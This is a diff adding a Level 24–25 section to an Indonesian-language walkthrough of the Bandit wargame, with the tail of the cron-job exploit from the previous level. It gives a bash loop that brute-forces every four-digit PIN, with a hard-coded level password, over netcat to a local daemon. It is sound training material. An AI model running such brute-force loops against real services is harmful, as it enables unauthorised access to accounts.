@@ -253,3 +253,42 @@ A program is running automatically at regular intervals from **`cron`**, the ti
     - **`#!/bin/bash`**: Baris *shebang* yang wajib ada agar sistem tahu bahwa ini adalah script shell.
     - **`cat /etc/bandit_pass/bandit24 > ...`**: Isi perintah dalam script. Kita menyuruh user `bandit24` membaca password-nya sendiri dan menyimpannya ke file teks di folder kita.
     - **`cp exploit.sh /var/spool/bandit24/foo/`**: Meletakkan script di folder "tugas" bandit24. Semua file di folder ini akan dijalankan otomatis lalu dihapus oleh sistem.
+
+## Level 24 - Level 25
+
+### Level Goal
+
+A daemon is listening on port `30002` and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+You do not need to create new connections each time
+
+- Writeup
+    
+    Pada level ini, kita diminta untuk melakukan brute force pada layanan yang berjalan di port `30002`. Layanan tersebut memerlukan password dari level saat ini (bandit24) dan sebuah PIN 4-digit (0000-9999) yang dipisahkan oleh spasi.
+    
+    ```bash
+    # Membuat direktori kerja sementara di /tmp
+    mkdir /tmp/my_brute_force
+    cd /tmp/my_brute_force
+    
+    # Membuat script bash untuk menghasilkan 10.000 kombinasi PIN
+    # Ganti [ISI_PASSWORD_BANDIT24_DI_SINI] dengan password yang Anda miliki
+    cat <<EOF > solve.sh
+    #!/bin/bash
+    password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+    for i in {0000..9999}
+    do
+        echo "$password $i"
+    done | nc localhost 30002
+    EOF
+    
+    # Memberikan izin eksekusi pada script
+    chmod +x solve.sh
+    
+    # Menjalankan script
+    ./solve.sh
+    ```
+    
+    - **`mkdir /tmp/my_brute_force`**: Membuat folder di direktori `/tmp` karena user bandit hanya memiliki izin menulis (write access) di sana, bukan di home directory.
+    - **`for i in {0000..9999}`**: Sebuah perulangan (loop) yang secara otomatis menghasilkan angka berurutan dari 0000 sampai 9999 dengan format 4 digit.
+    - **`nc localhost 30002`**: Menghubungkan output dari script ke layanan yang berjalan di port 30002. Netcat akan mengirimkan semua kombinasi password+PIN dalam satu sesi koneksi.
